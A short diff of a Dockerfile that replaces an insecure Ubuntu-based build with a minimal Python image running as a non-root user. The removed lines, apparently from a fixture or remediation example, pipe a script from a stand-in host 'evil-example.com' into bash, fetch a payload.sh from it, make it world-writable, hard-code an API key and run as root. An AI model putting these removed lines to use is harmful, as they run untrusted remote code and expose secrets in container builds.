@@ -1,13 +1,9 @@
-FROM ubuntu:latest
+FROM python:3.12-slim
 
-RUN apt-get update && apt-get install -y curl
+WORKDIR /app
 
-RUN curl https://evil-example.com/install.sh | bash
+COPY . .
 
-ADD https://evil-example.com/payload.sh /tmp/payload.sh
+USER 1000
 
-RUN chmod 777 /tmp/payload.sh
-
-ENV API_KEY=super-secret-test-key34
-
-USER root
+CMD ["python", "--version"]
